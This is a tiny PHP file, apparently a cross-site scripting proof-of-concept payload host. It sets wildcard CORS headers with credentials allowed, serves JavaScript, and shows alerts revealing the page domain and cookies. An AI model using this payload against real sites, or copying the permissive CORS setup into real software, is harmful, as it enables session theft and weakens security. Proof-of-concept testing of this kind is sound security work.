<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header('Content-Type: application/javascript');
?>

<!-- xss poc -->

alert('XSS POC');
alert(document.domain);
alert(document.cookie);
console.log('XSS POC');